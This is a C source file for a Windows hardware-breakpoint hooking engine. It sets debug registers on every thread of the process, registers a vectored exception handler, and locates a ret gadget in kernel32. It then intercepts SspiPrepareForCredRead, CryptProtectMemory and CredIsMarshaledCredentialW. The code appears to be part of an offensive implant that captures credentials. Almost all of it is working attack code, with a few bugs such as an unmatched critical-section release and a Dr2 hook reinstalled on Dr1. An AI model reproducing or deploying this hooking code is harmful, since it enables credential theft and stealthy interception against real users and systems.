#include "hwbp.h"

FUNC PVOID FindRetGadget(HMODULE module) {
    BYTE* baseAddress = (BYTE*)module;
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
    IMAGE_SECTION_HEADER* sectionHeaders = IMAGE_FIRST_SECTION(ntHeaders);

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        BYTE* sectionStart = baseAddress + sectionHeaders[i].VirtualAddress;
        DWORD sectionSize = sectionHeaders[i].SizeOfRawData;

        for (DWORD j = 0; j < sectionSize; j++) {
            if (sectionStart[j] == 0xC3) {
                return (void*)(sectionStart + j);
            }
        }
    }
    return NULL;
}

FUNC BOOL InitializeHWBPEngine(VOID) {
    MAIN_INSTANCE

    RtlSecureZeroMemory(&Instance()->HwbpEngine.g_CriticalSection, sizeof(CRITICAL_SECTION));

    if (Instance()->HwbpEngine.g_CriticalSection.DebugInfo == NULL) {
        InitializeCriticalSection_(&Instance()->HwbpEngine.g_CriticalSection);
    }

    if (!Instance()->HwbpEngine.g_VectorHandler) {
        Instance()->HwbpEngine.GlobalHardwareBreakpointObject.HandlerObject = AddVectoredExceptionHandler_(1, exceptionHandler);
    }

    if(Instance()->HwbpEngine.GlobalHardwareBreakpointObject.HandlerObject == NULL)
        return FALSE;

    Instance()->HwbpEngine.g_Ret = FindRetGadget(Instance()->HandlesDll.kernel32);
    Instance()->HwbpEngine.GlobalHardwareBreakpointObject.IsInit = TRUE;

    return TRUE;
}

FUNC BOOL ShutdownHWBPEngine(VOID) {
    MAIN_INSTANCE

    DESCRIPTOR_ENTRY *Temp = NULL;

    if (!Instance()->HwbpEngine.GlobalHardwareBreakpointObject.IsInit)
        return TRUE;

    EnterCriticalSection_(&Instance()->HwbpEngine.g_CriticalSection);
    Temp = Instance()->HwbpEngine.g_Head;
    while (Temp != NULL) {
        RemoveDescriptorEntry(Temp->Address, Temp->ThreadId);
        Temp = Temp->Next;
    }

    LeaveCriticalSection_(&Instance()->HwbpEngine.g_CriticalSection);

    if (Instance()->HwbpEngine.GlobalHardwareBreakpointObject.HandlerObject)
        RemoveVectoredExceptionHandler_(Instance()->HwbpEngine.GlobalHardwareBreakpointObject.HandlerObject);

    DeleteCriticalSection_(&Instance()->HwbpEngine.g_CriticalSection);
    Instance()->HwbpEngine.GlobalHardwareBreakpointObject.IsInit = FALSE;

    return TRUE;
}

FUNC BOOL RemoveHWBPHook(uintptr_t Address, DWORD Tid) {
    MAIN_INSTANCE
    DESCRIPTOR_ENTRY* Temp = NULL;
    DRX     Drx  = -1;
    BOOL    Seen = FALSE;

    Temp = Instance()->HwbpEngine.g_Head;
    while(Temp != NULL) {
        if(Temp->Address == Address && Temp->ThreadId == Tid){
            Seen = TRUE;
            Drx = Temp->Drx;

            if(Instance()->HwbpEngine.g_Head == Temp)
                Instance()->HwbpEngine.g_Head = Temp->Next;
            if(Temp->Next != NULL)
                Temp->Next->Previous = Temp->Previous;
            if(Temp->Previous != NULL)
                Temp->Previous->Next = Temp->Next;
        }
        if (Temp)
            Temp = Temp->Next;
    }

    LeaveCriticalSection_(&Instance()->HwbpEngine.g_CriticalSection);
    if(Seen)
        return SnapshotInsertHardwareBreakpointHookIntoTargetThread(Address, Drx, FALSE, Tid);
}

FUNC BOOL RemoveDescriptorEntry(uintptr_t Address, DWORD Tid) {
    MAIN_INSTANCE
    DESCRIPTOR_ENTRY *Temp = NULL;
    DWORD Position = ERROR_SUCCESS;
    BOOL bFlag = FALSE;
    BOOL Found = FALSE;

    EnterCriticalSection_(&Instance()->HwbpEngine.g_CriticalSection);
    Temp = Instance()->HwbpEngine.g_Head;
    while (Temp != NULL) {
        if (Temp->Address == Address && Temp->ThreadId == Tid) {
            Found = TRUE;
            if (Instance()->HwbpEngine.g_Head == Temp)
                Instance()->HwbpEngine.g_Head = Temp->Next;

            if (Temp->Next != NULL)
                Temp->Next->Previous = Temp->Previous;

            if (Temp->Previous != NULL)
                Temp->Previous->Next = Temp->Next;

            if(Temp)
                LocalFree_(Temp);
        }
        if(Temp)
            Temp = Temp->Next;
    }

    LeaveCriticalSection_(&Instance()->HwbpEngine.g_CriticalSection);
    if (Found)
        bFlag = SnapshotInsertHardwareBreakpointHookIntoTargetThread(Address, Position, FALSE, Tid);

    return bFlag;
}

FUNC BOOL SnapshotInsertHardwareBreakpointHookIntoTargetThread(uintptr_t Address, DRX Drx, BOOL Init, DWORD Tid) {
    MAIN_INSTANCE
    HANDLE hHandle                              = INVALID_HANDLE_VALUE;
    ULONG uReturnLen1                           = 0;
    ULONG uReturnLen2                           = 0;
    PSYSTEM_PROCESS_INFORMATION SystemProcInfo  = NULL;
    PVOID pValueToFree                          = NULL;
    NTSTATUS STATUS                             = FALSE;
    BOOL bFlag                                  = FALSE;

    STATUS = Instance()->NtdllDll._NtQuerySystemInformation(SystemProcessInformation, NULL, (ULONG) NULL, &uReturnLen1);
    if (STATUS != STATUS_SUCCESS && STATUS != STATUS_INFO_LENGTH_MISMATCH)
        goto _EndOfFunc;

    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)LocalAlloc_(LPTR, (SIZE_T)uReturnLen1);
    if (SystemProcInfo == NULL)
        goto _EndOfFunc;

    pValueToFree = SystemProcInfo;
    STATUS = Instance()->NtdllDll._NtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
    if (STATUS != STATUS_SUCCESS)
        goto _EndOfFunc;

    while(TRUE) {
        if(SystemProcInfo->UniqueProcessId == GetCurrentProcessId_()) {
            PSYSTEM_THREAD_INFORMATION SystemThreadInfo = (PSYSTEM_THREAD_INFORMATION)SystemProcInfo->Threads;

            for (DWORD i=0; i< SystemProcInfo->NumberOfThreads; i++) {
                if(Tid != ALL_THREADS && Tid != SystemThreadInfo[i].ClientId.UniqueThread)
                    continue;

                if(!SetHardwareBreakpoint((DWORD) SystemThreadInfo[i].ClientId.UniqueThread, Address, Drx, Init))
                    goto _EndOfFunc;
            }
            break;
        }
        if (!SystemProcInfo->NextEntryOffset)
            break;

        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
    }

    bFlag = TRUE;

    _EndOfFunc:
        if (pValueToFree)
            LocalFree_(pValueToFree);

    return bFlag;
}

FUNC unsigned long long setDr7(unsigned long long CurrentDr7, int StartingBitPosition, int bits, unsigned long long newBits) {

    unsigned long long mask         = (1UL << bits) - 1UL;
    unsigned long long newDr7       = (CurrentDr7 & ~(mask << StartingBitPosition)) | (newBits << StartingBitPosition);

    return newDr7;
}

FUNC BOOL SetHardwareBreakpoint(DWORD ThreadId, uintptr_t Address, DRX Drx, BOOL Init) {
    MAIN_INSTANCE

    CONTEXT Context = { 0 };
    Context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hHandle = INVALID_HANDLE_VALUE;
    BOOL bFlag = FALSE;

    if (ThreadId != GetCurrentThreadId_()) {
        hHandle = OpenThread_(THREAD_ALL_ACCESS, (WINBOOL)FALSE, ThreadId);
        if (hHandle == NULL) {
            goto EXIT_ROUTINE;
        }
    }
    else
        hHandle = ((HANDLE)(LONG_PTR)-2);

    if (!GetThreadContext_(hHandle, &Context))
        goto EXIT_ROUTINE;

    if (Init) {
        (&Context.Dr0)[Drx] = Address;
        Context.Dr7 = setDr7(Context.Dr7, (Drx*2), 1, 1);
    }
    else {
        if ((&Context.Dr0)[Drx] == Address) {
            (&Context.Dr0)[Drx] = 0ull;
            Context.Dr7 = setDr7(Context.Dr7, (Drx * 2), 1, 0);

        }
    }

    if (!SetThreadContext_(hHandle, &Context))
        goto EXIT_ROUTINE;

    bFlag = TRUE;

    EXIT_ROUTINE:
        if (hHandle)
            CloseHandle_(hHandle);
    return bFlag;
}

FUNC BOOL InstallHWBPHook(uintptr_t Address, DRX Drx, PVOID CallbackRoutine, DWORD Tid) {
    MAIN_INSTANCE
    DESCRIPTOR_ENTRY* newEntry = NULL;

    newEntry = (DESCRIPTOR_ENTRY*) LocalAlloc_(LPTR, sizeof (DESCRIPTOR_ENTRY ));
    if(newEntry == NULL) {
        goto _EndOfFunc;
    }

    EnterCriticalSection_(&Instance()->HwbpEngine.g_CriticalSection);

    newEntry->Address           = Address;
    newEntry->Drx               = Drx;
    newEntry->ThreadId          = Tid;
    newEntry->CallbackFunction  = CallbackRoutine;
    newEntry->Next              = Instance()->HwbpEngine.g_Head;
    newEntry->Previous          = NULL;

    if(Instance()->HwbpEngine.g_Head != NULL) {
        Instance()->HwbpEngine.g_Head->Previous = newEntry;
    }

    Instance()->HwbpEngine.g_Head = newEntry;
    LeaveCriticalSection_(&Instance()->HwbpEngine.g_CriticalSection);

    return SnapshotInsertHardwareBreakpointHookIntoTargetThread(Address, Drx, TRUE, Tid);

    _EndOfFunc:
        return FALSE;
}

FUNC LONG WINAPI exceptionHandler(PEXCEPTION_POINTERS exceptions) {
    MAIN_INSTANCE

    if(exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if(exceptions->ExceptionRecord->ExceptionAddress == exceptions->ContextRecord->Dr0) {
            RemoveHWBPHook((uintptr_t) exceptions->ExceptionRecord->ExceptionAddress, ALL_THREADS);
            _SspiPrepareForCredRead(exceptions->ContextRecord);
            InstallHWBPHook((uintptr_t) Instance()->HwbpAPIS.SspiPrepareForCredRead, Dr0, _SspiPrepareForCredRead, ALL_THREADS);
        }
        else if(exceptions->ExceptionRecord->ExceptionAddress == exceptions->ContextRecord->Dr1) {
            RemoveHWBPHook((uintptr_t) exceptions->ExceptionRecord->ExceptionAddress, ALL_THREADS);
            _CryptProtectMemory(exceptions->ContextRecord);
            InstallHWBPHook((uintptr_t) Instance()->HwbpAPIS.CryptProtectMemory, Dr1, _CryptProtectMemory, ALL_THREADS);
        }
        else if(exceptions->ExceptionRecord->ExceptionAddress == exceptions->ContextRecord->Dr2) {
            RemoveHWBPHook((uintptr_t) exceptions->ExceptionRecord->ExceptionAddress, ALL_THREADS);
            _CredIsMarshaledCredentialW(exceptions->ContextRecord);
            InstallHWBPHook((uintptr_t) Instance()->HwbpAPIS.CredIsMarshaledCredentialW, Dr1, _CredIsMarshaledCredentialW, ALL_THREADS);
        }
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    else {
        return EXCEPTION_CONTINUE_SEARCH;
    }
}